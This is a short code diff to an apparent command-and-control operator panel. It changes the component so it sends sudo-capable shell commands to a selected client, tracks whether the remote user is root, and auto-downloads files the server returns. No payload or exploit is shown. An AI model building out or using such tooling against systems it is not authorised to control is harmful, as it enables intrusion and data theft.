@@ -217,13 +217,16 @@ export function CommandCenter() {
         command: command.trim(),
         client_id: selectedClient,
         sudo: sudoMode,
-      }) as { status?: string; command_id?: number; result?: string; cwd?: string; user?: string };
+      }) as { status?: string; command_id?: number; result?: string; cwd?: string; user?: string; download_path?: string };
 
       // Update shell state if [C2-Server] responded
       if (res.cwd)  setServerCwd(res.cwd);
       if (res.user) { setServerUser(res.user); setIsRoot(res.user === 'root'); }
 
-      if (res.result !== undefined) {
+      // If server says there's a file to download, trigger it
+      if (res.download_path) {
+        await handleDownload(res.download_path);
+      } else if (res.result !== undefined) {
         toast.success(`Executed on ${selectedClient}`, 'Done ✓');
       } else {
         toast.success(`Queued for ${selectedClient}`, 'Queued ✓');
